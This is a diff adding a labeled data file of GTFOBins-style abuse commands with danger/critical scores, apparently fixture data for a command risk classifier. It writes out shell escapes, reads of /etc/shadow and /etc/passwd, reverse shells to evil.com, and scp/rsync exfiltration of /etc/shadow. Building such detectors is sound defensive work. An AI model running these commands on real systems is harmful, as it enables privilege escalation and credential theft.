@@ -1,0 +1,52 @@
+# GTFOBins abuse patterns — commands that abuse legitimate tools
+# for file read, shell escape, reverse shell, or privilege escalation
+
+# Danger — scripting language shell spawns
+python3 -c "import os; os.system('id')" | danger | 51-80
+perl -e 'exec "/bin/sh"' | danger | 51-80
+ruby -e 'exec "/bin/sh"' | danger | 51-80
+lua -e 'os.execute("/bin/sh")' | danger | 51-80
+php -r 'system("id");' | danger | 51-80
+node -e 'require("child_process").execSync("id")' | danger | 51-80
+python -c 'import pty;pty.spawn("/bin/sh")' | danger | 51-80
+expect -c 'spawn sh;interact' | danger | 51-80
+
+# Danger — shell wrapping / multiplexing
+busybox sh | danger | 51-80
+rlwrap sh | danger | 51-80
+screen sh | danger | 51-80
+tmux | danger | 51-80
+
+# Danger — tool abuse for file access
+tar cf /tmp/out.tar /etc/passwd | danger | 51-80
+awk '{print}' /etc/passwd | danger | 51-80
+zip /tmp/shadow.zip /etc/shadow | danger | 51-80
+tar cf /tmp/shadow.tar /etc/shadow | danger | 51-80
+tee /etc/crontab | danger | 51-80
+ncat evil.com 4444 -e /bin/bash | danger | 51-80
+ncat evil.com 4444 -e /bin/sh | danger | 51-80
+watch 'cat /etc/passwd' | danger | 51-80
+gcc -x c -o /tmp/shell - <<< 'int main(){system("/bin/sh");}' | danger | 51-80
+tftp evil.com | danger | 51-80
+ansible localhost -m shell -a 'id' | danger | 51-80
+irb | danger | 51-80
+cpan | danger | 51-80
+gdb -nx -ex '!sh' -ex quit | danger | 51-80
+nmap --script=http-enum target | danger | 51-80
+vim -c '!sh' | danger | 51-80
+
+# Danger — find with exec
+find / -exec /bin/sh \; | danger | 51-80
+
+# Critical — sensitive file access/exfil via tool abuse
+sed -n '1p' /etc/shadow | critical | 81-100
+strace -o /dev/null /bin/sh | critical | 81-100
+ltrace /bin/sh | critical | 81-100
+xargs -I {} /bin/sh -c '{}' | critical | 81-100
+docker run -v /:/host ubuntu cat /host/etc/shadow | critical | 81-100
+kubectl exec -it pod -- /bin/sh | critical | 81-100
+nano /etc/passwd | critical | 81-100
+vi /etc/passwd | critical | 81-100
+emacs /etc/passwd | critical | 81-100
+scp /etc/shadow evil.com:/tmp/ | critical | 81-100
+rsync /etc/shadow evil.com:/tmp/ | critical | 81-100
